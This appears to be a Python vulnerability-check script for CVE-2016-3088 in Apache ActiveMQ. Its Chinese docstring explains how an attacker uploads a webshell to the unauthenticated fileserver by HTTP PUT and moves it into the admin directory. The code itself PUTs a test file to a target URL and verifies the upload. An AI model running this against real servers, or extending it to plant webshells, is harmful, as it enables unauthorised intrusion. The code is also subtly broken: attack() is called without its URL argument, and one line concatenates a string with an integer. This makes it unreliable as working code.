# -*- coding: utf-8 -*-
import requests
import string
from random import *
import time


'''
Usage:
    moon.py -u  activemq  http://xx.xx.xx.xx:xxxx
    CVE-2016-3088   
    影响范围：Apache ActiveMQ 5.0.0 - 5.13.2   在5.12.x~5.13.x已默认关闭 5.14彻底删除相关文件
    简介：ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷。在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。
    漏洞原理：ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录，构造PUT请求上传 webshell 到 fileserver 目录，然后通过 Move 方法将其移动到有执行权限的 admin/ 目录。这里移动文件需要具有相关权限，因此要想拿shel需要有activemq的账户和密码。
    这里只测试上传这一步看看是否可行
'''

def attack(URL):
    print('[+]开始检测-ActiveMQ任意文件写入漏洞（CVE-2016-3088）。[+]')
    filename = gen_shell()
    url = URL + '/fileserver/'+filename+'.txt'
    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
    headers={"User-Agent":user_agent}
    data="""CVE-2016-3088-file_upload_test"""
    try:
        requests.put(url, headers=headers, data=data)
        time.sleep(2)
        verify_response = requests.get(url, headers=headers)
        if verify_response.status_code == 200 and 'CVE-2016-3088-file_upload_test' in verify_response.text:
            print('文件上传成功!!!')
            print('上传文件地址: ' + url)
        else :
            print('访问上传文件地址：'+verify_response.status_code)
            print("未能成功上传文件。")
    except :
        print("未发现-ActiveMQ任意文件写入漏洞（CVE-2016-3088）。")
    print('[+]检测结束-ActiveMQ任意文件写入漏洞（CVE-2016-3088）。[+]')
    print('\n')
def gen_shell():
    min_char = 4
    max_char = 12
    allchar = string.ascii_letters + string.digits
    shell_name = "".join(choice(allchar) for x in range(randint(min_char, max_char)))
    return shell_name


if __name__ == "__main__":
    attack()
